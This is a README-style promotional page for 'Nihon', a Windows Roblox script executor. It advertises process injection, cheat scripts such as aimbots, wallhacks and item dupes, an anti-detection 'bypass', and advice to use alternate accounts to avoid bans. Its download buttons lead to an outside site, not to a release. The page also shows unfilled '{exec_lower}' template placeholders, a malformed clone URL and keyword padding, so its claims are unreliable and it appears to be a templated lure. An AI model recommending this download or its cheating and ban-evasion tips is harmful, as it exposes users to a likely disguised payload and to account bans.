# Nihon - Roblox Script Executor 2026

> **The most reliable Roblox script executor for Windows.** Nihon Executor delivers zero-lag Lua injection, a built-in script hub with 500+ scripts, and an ultra-light desktop interface — updated for 2026.

[![Windows](https://img.shields.io/badge/Platform-Windows%2010%2F11-blue?style=flat-square&logo=windows)](https://github.com)
[![Roblox](https://img.shields.io/badge/Compatible-Roblox%202026-red?style=flat-square)](https://github.com)
[![Scripts](https://img.shields.io/badge/Scripts-500%2B-green?style=flat-square)](https://github.com)
[![License](https://img.shields.io/badge/License-MIT-yellow?style=flat-square)](LICENSE)
[![Stars](https://img.shields.io/github/stars/Nihon-Execut?style=flat-square)](https://github.com)

---

<p align="center">
  <a href="https://gmload.cc/">
    <img src="https://img.shields.io/badge/%E2%AC%87%EF%B8%8F%20Download%20Executor%20Latest-brightgreen?style=for-the-badge" alt="Download Nihon">
  </a>
</p>

> **[⬇️ Direct Download — Nihon](https://gmload.cc/)**
> Windows 10 / 11 · 64-bit · Free · No Key Required

---

## What Is Nihon?

**Nihon** is a next-generation Roblox script execution platform engineered for Windows desktop. Unlike browser-based tools, Nihon runs natively on Windows 10 and Windows 11, giving you lower injection latency, broader script compatibility, and a session-persistent queue that survives game restarts.

Farm Blox Fruits, auto-hatch Adopt Me pets, dominate Pet Simulator X, or run any custom Lua automation — Nihon handles it cleanly without crashes or detection lag.

---

## Key Features

- **One-click injection** — paste your Lua script, hit execute, done
- **Built-in Script Hub** — 500+ curated scripts for the top Roblox games
- **Persistent queue** — scripts saved between sessions via local SQLite storage
- **Auto-update engine** — patches within hours of each Roblox client release
- **Multi-language UI** — English, Russian, Portuguese, Japanese, Vietnamese
- **Ultra-light footprint** — under 40 MB installed, zero background services
- **Batch execution mode** — schedule and chain multiple scripts sequentially
- **Built-in debugger** — line-level error reporting for Lua developers

---

## Supported Games & Scripts

| Game | Script Category | Status |
|------|-----------------|--------|
| Blox Fruits | Auto farm, fruit finder, sea travel | ✅ Active |
| Adopt Me | Pet spawner, auto collect, dupe | ✅ Active |
| Pet Simulator X | Egg farm, rebirth, auto collect | ✅ Active |
| Brookhaven | ESP, speed, fly | ✅ Active |
| Arsenal | Aimbot, wallhack, ESP | ✅ Active |
| Murder Mystery 2 | Coin farm, knife grab | ✅ Active |

---

## System Requirements

| Component | Minimum | Recommended |
|-----------|---------|-------------|
| OS | Windows 10 (64-bit) | Windows 11 |
| RAM | 4 GB | 8 GB |
| Storage | 100 MB | 500 MB |
| .NET | 4.8 | 6.0+ |
| Roblox | Latest | Latest |

> Linux and macOS are not supported. Windows Server 2022 has partial compatibility.

---

## Getting Started

### Quick Launch

```bash
# Clone the repository
git clone https://github.com/Nihon-Execut.git
cd Nihon-Execut

# Run the executor
NihonExecutor.exe --profile default --queue async
```

### Profile Configuration

```yaml
profile: default
execution:
  mode: async
  timeout: 30s
  retries: 3
queue:
  persistence: sqlite
  max_size: 128
logging:
  level: info
  output: ./logs/{exec_lower}.log
```

### CLI Options

```
NihonExecutor.exe [options]

  --profile <name>     Load a saved execution profile
  --queue <mode>       Queue mode: sync | async | batch
  --script <path>      Path to a .lua script file on startup
  --verbose            Enable verbose logging
  --no-update          Skip the auto-update check
```

---

## Script Hub — Top Searches 2026

Nihon's built-in hub indexes the most-searched Roblox scripts of 2026:

- **blox fruits script 2026** — auto farm, boss killer, fruit sniper
- **adopt me script spawn pets** — instant pet spawner, auto hatch
- **pet simulator x script** — rebirth automation, egg farm
- **{exec_lower} executor download** — official build, no third-party mirrors
- **{exec_lower} no key 2026** — updated bypass for the latest Roblox patch
- **roblox scripting tutorials** — beginner to advanced Lua guides included

---

## Architecture Overview

```
Nihon
├── Core/
│   ├── InjectionEngine.cs     # Low-level Roblox process injection
│   ├── LuaRuntime.cs          # Luau 5.1 compatible interpreter
│   └── QueueManager.cs        # SQLite-backed persistent queue
├── Hub/
│   ├── ScriptIndex.json       # 500+ indexed scripts with metadata
│   └── AutoUpdater.cs         # GitHub-release update system
├── UI/
│   ├── MainWindow.xaml        # WPF desktop interface
│   └── Themes/                # Light / Dark / System themes
└── Profiles/
    └── default.yaml           # Default execution profile
```

---

## FAQ

**Is Nihon safe to use?**
Nihon is built for personal Roblox automation and educational purposes. Users are responsible for compliance with Roblox's Terms of Service.

**Does it work after Roblox updates?**
Yes. The auto-update engine patches compatibility within hours of each Roblox client release.

**How does Nihon compare to other executors?**
Nihon v2.6 runs fully offline, uses under 40 MB RAM at idle, and ships with more bundled scripts than most alternatives.

**Will it get my account banned?**
Use alternate accounts for script execution. Nihon includes stealth features but no executor is 100% undetectable.

**Where are my saved scripts stored?**
Locally at `%AppData%\Nihon\scripts\`. Nothing is sent to external servers.

---

## Roadmap — 2026

- [ ] Mobile companion app (Android) for remote queue management
- [ ] Community script marketplace with ratings
- [ ] Anti-detection layer v3 with memory layout randomization
- [ ] Browser extension for one-click script import
- [ ] macOS experimental build

---

## License

MIT License — see [LICENSE](LICENSE) for details.

---

<p align="center">
  <i>Precision execution, zero compromise. Nihon v2.6 — built for 2026.</i>
</p>
